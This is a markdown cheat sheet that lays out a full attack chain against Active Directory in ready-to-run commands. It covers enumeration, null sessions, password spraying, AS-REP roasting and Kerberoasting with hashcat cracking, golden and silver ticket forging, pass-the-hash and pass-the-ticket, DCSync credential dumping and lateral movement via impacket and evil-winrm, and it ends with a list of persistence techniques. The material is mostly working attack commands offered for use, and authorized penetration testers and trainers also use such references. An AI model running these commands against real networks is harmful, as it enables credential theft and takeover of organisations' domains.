# Active Directory Full Attack Chain

## 1. Enumeration
```bash
# BloodHound
bloodhound-python -u user -p password -d domain.com -c All
# ldapsearch
ldapsearch -x -H ldap://dc -b "DC=domain,DC=com" "(objectClass=*)"
# enum4linux
enum4linux -a target
# rpcclient
rpcclient -U "" -N target
# crackmapexec
crackmapexec smb target -u '' -p ''
crackmapexec ldap target -u user -p password --users
crackmapexec ldap target -u user -p password --groups
```

## 2. Null Session
```bash
smbclient -L //target -N
rpcclient -U "" -N target
enum4linux -a target
```

## 3. Password Spraying
```bash
crackmapexec smb target -u users.txt -p 'Password1' --continue-on-success
kerbrute passwordspray --dc dc.domain.com domain.com users.txt 'Password1'
```

## 4. AS-REP Roasting
```bash
# Find AS-REP roastable users
impacket-GetNPUsers domain.com/user:password -dc-ip dc_ip -usersfile users.txt -format hashcat
# Crack
hashcat -m 18200 asrep.txt rockyou.txt
```

## 5. Kerberoasting
```bash
# Request TGS tickets
impacket-GetUserSPNs domain.com/user:password -dc-ip dc_ip -request
# Crack
hashcat -m 13100 tgs.txt rockyou.txt
```

## 6. Golden Ticket
```bash
# With krbtgt hash
impacket-ticketer -nthash krbtgt_hash -domain-sid S-1-5-21-... -domain domain.com administrator
export KRB5CCNAME=admin.ccache
```

## 7. Silver Ticket
```bash
# With service account hash
impacket-ticketer -nthash svc_hash -domain-sid S-1-5-21-... -domain domain.com -spn cifs/target administrator
```

## 8. Pass-the-Hash
```bash
crackmapexec smb target -u administrator -H 'ntlm_hash'
impacket-psexec -hashes :ntlm_hash domain/administrator@target
impacket-wmiexec -hashes :ntlm_hash domain/administrator@target
```

## 9. Pass-the-Ticket
```bash
export KRB5CCNAME=ticket.ccache
impacket-psexec -k -no-pass domain/administrator@target
```

## 10. DCSync
```bash
impacket-secretsdump domain/user:password@dc_ip
impacket-secretsdump -hashes :ntlm_hash domain/administrator@dc_ip
```

## 11. Lateral Movement
```bash
# PsExec
impacket-psexec domain/user:password@target
# WMIExec
impacket-wmiexec domain/user:password@target
# SMBExec
impacket-smbexec domain/user:password@target
# AtExec
impacket-atexec domain/user:password@target "whoami"
# WinRM
evil-winrm -i target -u user -p password
```

## 12. Persistence
```bash
# Golden Ticket
# Skeleton Key
# AdminSDHolder
# DSRM backdoor
# SID History
```
